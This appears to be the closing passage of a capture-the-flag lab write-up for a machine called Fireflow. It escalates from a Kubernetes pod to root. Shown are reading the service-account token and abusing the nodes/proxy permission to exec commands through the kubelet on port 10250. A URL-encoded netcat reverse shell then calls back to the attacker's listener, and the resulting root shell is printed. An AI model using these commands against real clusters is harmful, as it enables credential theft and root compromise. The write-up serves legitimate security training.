+tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:10249         0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:10248         0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:10259         0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:10258         0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:10257         0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:10256         0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:6444          0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp6       0      0 :::9100                 :::*                    LISTEN      off (0.00/0/0)
+tcp6       0      0 :::6443                 :::*                    LISTEN      off (0.00/0/0)
+tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
+tcp6       0      0 :::10250                :::*                    LISTEN      off (0.00/0/0)</code></pre><p>A lot of ports that are common in kubernetes</p><h2>Kubernetes proxy/node abuse to get code execution as root</h2><p><a href="https://www.aquasec.com/blog/privilege-escalation-kubernetes-rbac/" target="_blank" rel="noreferrer">https://www.aquasec.com/blog/privilege-escalation-kubernetes-rbac/</a></p><p><a href="https://grahamhelton.com/blog/nodes-proxy-rce" target="_blank" rel="noreferrer">https://grahamhelton.com/blog/nodes-proxy-rce</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">mcp@mcp-server-54464cb475-29ztf:~$ ls -al /var/run/secrets/kubernetes.io/serviceaccount/
+total 4
+drwxrwxrwt 3 root root  140 Aug 24 15:06 .
+drwxr-xr-x 3 root root 4096 Aug 24 15:06 ..
+drwxr-xr-x 2 root root  100 Aug 24 15:06 ..2026_08_24_15_06_27.474867771
+lrwxrwxrwx 1 root root   31 Aug 24 15:06 ..data -&gt; ..2026_08_24_15_06_27.474867771
+lrwxrwxrwx 1 root root   13 Aug 24 15:06 ca.crt -&gt; ..data/ca.crt
+lrwxrwxrwx 1 root root   16 Aug 24 15:06 namespace -&gt; ..data/namespace
+lrwxrwxrwx 1 root root   12 Aug 24 15:06 token -&gt; ..data/token</code></pre><p>This information found in this directory will be important, and as seen i have a full permissions on these files</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">mcp@mcp-server-54464cb475-29ztf:~$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+mcp@mcp-server-54464cb475-29ztf:~$ CA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)
+mcp@mcp-server-54464cb475-29ztf:~$ NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)</code></pre><p>Ill export all these values as variables</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">mcp@mcp-server-54464cb475-29ztf:~$ curl -X POST -ks https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H &quot;Authorization: Bearer $TOKEN&quot; -H &quot;Content-Type: application/json&quot; --data &#39;{&quot;apiVersion&quot;:&quot;authorization.k8s.io/v1&quot;,&quot;kind&quot;:&quot;SelfSubjectRulesReview&quot;,&quot;spec&quot;:{&quot;namespace&quot;:&quot;default&quot;}}&#39; | python3 -m json.tool
+{
+    &quot;kind&quot;: &quot;SelfSubjectRulesReview&quot;,
+    &quot;apiVersion&quot;: &quot;authorization.k8s.io/v1&quot;,
+    &quot;metadata&quot;: {},
+    &quot;spec&quot;: {},
+    &quot;status&quot;: {
+        &quot;resourceRules&quot;: [
+            {
+                &quot;verbs&quot;: [
+                    &quot;create&quot;
+                ],
+                &quot;apiGroups&quot;: [
+                    &quot;authorization.k8s.io&quot;
+                ],
+                &quot;resources&quot;: [
+                    &quot;selfsubjectaccessreviews&quot;,
+                    &quot;selfsubjectrulesreviews&quot;
+                ]
+            },
+            {
+                &quot;verbs&quot;: [
+                    &quot;create&quot;
+                ],
+                &quot;apiGroups&quot;: [
+                    &quot;authentication.k8s.io&quot;
+                ],
+                &quot;resources&quot;: [
+                    &quot;selfsubjectreviews&quot;
+                ]
+            },
+            {
+                &quot;verbs&quot;: [
+                    &quot;get&quot;
+                ],
+                &quot;apiGroups&quot;: [
+                    &quot;&quot;
+                ],
+                &quot;resources&quot;: [
+                    &quot;nodes/proxy&quot;
+                ]
+            }</code></pre><p>As seen here i have the <code>nodes/proxy</code> resource set, this can be abused to get code execution as root</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -sk https://10.129.244.214:10250/pods -H &quot;Authorization: Bearer $TOKEN&quot; | jq -r &#39;.items[] | &quot;\(.metadata.namespace)/\(.metadata.name) -&gt; \([.spec.containers[].name])&quot;&#39;
+
+monitoring/prometheus-server-867bb4fcfd-m4t59 -&gt; [&quot;prometheus-server-configmap-reload&quot;,&quot;prometheus-server&quot;]
+monitoring/prometheus-kube-state-metrics-7c8c787854-25j6q -&gt; [&quot;kube-state-metrics&quot;]
+default/mcp-server-54464cb475-29ztf -&gt; [&quot;mcp-server&quot;]
+monitoring/prometheus-prometheus-node-exporter-nmntq -&gt; [&quot;node-exporter&quot;]
+kube-system/coredns-76c974cb66-cn7l6 -&gt; [&quot;coredns&quot;]
+kube-system/local-path-provisioner-8686667995-lp9th -&gt; [&quot;local-path-provisioner&quot;]
+kube-system/metrics-server-c8774f4f4-phw6q -&gt; [&quot;metrics-server&quot;]</code></pre><p>I then query the pods to find a suitable one i can use for RCE on the SSH session since thats the host with the port <code>10250</code> running</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nightfall@fireflow:~$ websocat --insecure --header &quot;Authorization: Bearer $TOKEN&quot; --protocol v4.channel.k8s.io &quot;wss://10.129.244.214:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&amp;error=1&amp;command=/bin/sh&amp;command=-c&amp;command=id&quot;
+
+uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
+{&quot;metadata&quot;:{},&quot;status&quot;:&quot;Success&quot;}
+
+
+websocat: WebSocketError: I/O failure
+websocat: error running</code></pre><p>I now have code execution as root!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1338</code></pre><p>Ill start a listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">websocat --insecure --header &quot;Authorization: Bearer $TOKEN&quot; --protocol v4.channel.k8s.io &quot;wss://10.129.244.214:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&amp;error=1&amp;command=/bin/sh&amp;command=-c&amp;command=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.61%201338%20%3E%2Ftmp%2Ff&quot;</code></pre><p>Ill then just use a URL encoded netcat reverse shell, to get a reverse shell as root</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1338
+[+] Listening for reverse shells on 0.0.0.0:1338 -&gt; 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] =&gt; fireflow 10.129.244.214 Linux-x86_64 👤 root(0) 😍️ Session ID &lt;1&gt;
+[+] Upgrading shell to PTY...
+[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
+[+] Attempting to spawn a reverse shell on 10.10.14.61:1338
+[+] [New Reverse Shell] =&gt; fireflow 10.129.244.214 Linux-x86_64 👤 root(0) 😍️ Session ID &lt;2&gt;
+[+] PTY upgrade successful via /bin/script
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/fireflow~10.129.244.214-Linux-x86_64/2026_08_24-19_41_12-297.log
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+/ # whoami
+root
+/ # </code></pre><p>I now have a root shell!</p><p><img src="images/fireflow/pasted-image-20260824194421.webp" alt="Screenshot" loading="lazy" /></p><p>I can now grab the root flag</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-ghost/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Ghost</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-darkzero/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">DarkZero</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
